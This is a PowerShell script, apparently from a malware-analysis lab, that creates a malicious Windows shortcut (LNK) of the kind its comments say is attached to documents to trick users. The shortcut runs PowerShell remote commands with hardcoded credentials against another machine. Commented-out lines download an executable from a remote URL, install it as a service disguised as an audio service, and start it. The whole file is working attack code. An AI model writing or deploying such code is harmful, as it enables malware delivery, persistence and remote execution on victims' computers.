# Malicious LNK files can be attached to documents and ran when the user opens the fake doc. Would normaly obfuscate 
# but for a demonstration im using just an LNK without attaching to a office doc.

# PowerShell command to execute
$lnkPath = "C:\Users\win-dev\Desktop\startsvc.lnk"




# PowerShell command to execute
# $maincommand = "& { iwr -Uri 'https://github.com/DTechOS/Malware-Reverse-Engineering/blob/main/testing/AudioSesPolicy.exe' -OutFile `'$env:TEMP\AudioSesSvc.exe'; New-Service -Name 'AudioSesPolicy' -BinaryPathName `'$env:TEMP\AudioSesSvc.exe'; Start-Service 'AudioSesPolicy' }"
#$psCommand = "powershell.exe -c $user='AudioPolicyMgmt'; $pass='!N0tadmin'; Invoke-Command -ScriptBlock { iwr -Uri 'https://github.com/DTechOS/Malware-Reverse-Engineering/blob/main/testing/AudioSesPolicy.exe' -OutFile `'$env:TEMP\AudioSesSvc.exe'; New-Service -Name 'AudioSesPolicy' -BinaryPathName `'$env:TEMP\AudioSesSvc.exe'; Start-Service 'AudioSesPolicy'} -ComputerName DESKTOP-B80GJMT -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) "


# NOTE: This isnt used for anything anymore, was testing some other not very stealthy methods of infection.
$pscommand = "-c $user='AudioPolicyMgmt'; $pass='!N0tadmin'; Invoke-Command -ScriptBlock { Get-Content C:\Users\win-dev\Desktop\stuff.txt } -ComputerName DESKTOP-B80GJMT -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))" 

# Create a LNK file
$targetPath = "C:\Windows\system32\cmd.exe"
$arguments = "/K powershell.exe -c $user='AudioPolicyMgmt'; $pass='!N0tadmin'; Invoke-Command -ScriptBlock { Get-Content C:\Users\win-dev\Desktop\stuff.txt } -ComputerName DESKTOP-B80GJMT -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))"
$workingDirectory = "C:\Windows\System32"

$shortcut = New-Object -ComObject WScript.Shell
$lnk = $shortcut.CreateShortcut($lnkPath)
$lnk.TargetPath = $targetPath
$lnk.Arguments = $arguments
$lnk.WorkingDirectory = $workingDirectory
$lnk.Save()